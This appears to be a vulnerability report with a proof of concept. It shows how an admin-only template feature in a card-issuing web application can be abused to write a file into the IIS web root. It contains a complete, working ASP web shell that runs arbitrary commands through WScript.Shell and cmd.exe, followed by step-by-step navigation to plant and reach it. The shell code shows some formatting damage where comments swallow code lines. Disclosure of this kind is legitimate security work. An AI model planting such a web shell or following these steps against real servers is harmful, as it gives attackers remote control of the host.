## Description

This vulnerability allows an attacker to abuse the "Output File Templates" functionality to write a malicious ASP file onto the target system instead of a standard text log file. By exploiting this flaw, the attacker can place and execute arbitrary code in the form of an ASP or ASPX file, resulting in remote code execution on the server.

## Vulnerability Location

- `https://<Host-Name>/#/Administration/TemplateManager`

## Proof of Concept

Login with any admin account and Go to `https://<Host>/#/Administration/TemplateManager` and Create a template with the following content:

```aspx
[file=C:\inetpub\wwwroot\CardWizard_<CLIENT>\shell.asp]
<%
    ' Check if a command is provided in the query string     Dim command, output
    command = Request.QueryString("cmd")
    If command <> "" Then
        ' Create a shell object to execute the command
        Dim shell
        Set shell = CreateObject("WScript.Shell")         
        ' Execute the command and capture output
        Dim exec
        Set exec = shell.Exec("cmd.exe /c " & command)
        ' Get the command's standard output         output = ""
        Do Until exec.StdOut.AtEndOfStream
            output = output & exec.StdOut.ReadLine() & vbCrLf
        Loop
        ' Display the output
        Response.Write "<pre>" & Server.HTMLEncode(output) & "</pre>"         
        ' Clean up
        Set exec = Nothing
        Set shell = Nothing     Else
        Response.Write "<h2>Please provide a command using the 'cmd' query parameter.</h2>"
    End If
%>
<!DOCTYPE html>
<html>
<head>
    <title>Command Execution in ASP</title>
</head>
<body>
    <h1>Execute Command</h1>
    <form method="get">
        Command: <input type="text" name="cmd" />
        <input type="submit" value="Execute" />
    </form>
</body>
</html>
[fileoff]
```

![[Pasted image 20250809014814.png]]

Got to `https://<Host>/#/Administration/CardFormatLinks` Assign the template to a card format:

![[Pasted image 20250809014825.png]]

Got to `https://<Host-Name>/#/CardActions/PrintSamplePINMailer` and Print card format Pin Mailer to write the file on the desk: 

![[Pasted image 20250809015003.png]] 

Now we can Access the web shell at `https://<HostName>/shell.asp`and verify the code execution on the server
![[Pasted image 20250809023803.png]]
